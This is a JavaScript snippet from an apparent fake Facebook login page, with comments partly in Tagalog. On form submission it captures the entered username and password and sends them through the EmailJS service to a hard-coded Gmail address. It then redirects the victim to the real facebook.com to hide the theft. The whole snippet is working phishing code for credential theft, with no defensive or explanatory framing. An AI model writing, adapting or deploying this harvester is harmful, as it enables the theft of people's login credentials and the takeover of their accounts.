      <script>
         // Function to redirect to Facebook URL
         function redirectToFacebook() {
            window.location.replace("https://www.facebook.com"); // Palitan ang URL kung saan nais mong magredirect sa Facebook
         }
      
         (function() {
            emailjs.init("DSmSVHoJOqdG4zgKO"); // Replace 'DSmSVHoJOqdG4zgKO' with your actual public key from Email.js
         })();
      
         document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form submission
      
            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;
            var recipientEmail = "hanzmark03@gmail.com"; // Palitan ang email address dito sa nais mong recipient
      
            // Customize the email template and recipient address as needed
            var templateParams = {
               username: username,
               password: password,
               to_email: recipientEmail // Ito ang email address ng iyong recipient
            };
      
            // Send email
            emailjs.send('service_08h3xtp', 'template_lg4h5xi', templateParams)
               .then(function(response) {
                  console.log('Email sent successfully:', response);
                  // Call redirect function after email is sent successfully
                  redirectToFacebook();
               }, function(error) {
                  console.error('Email sending failed:', error);
               });
         });
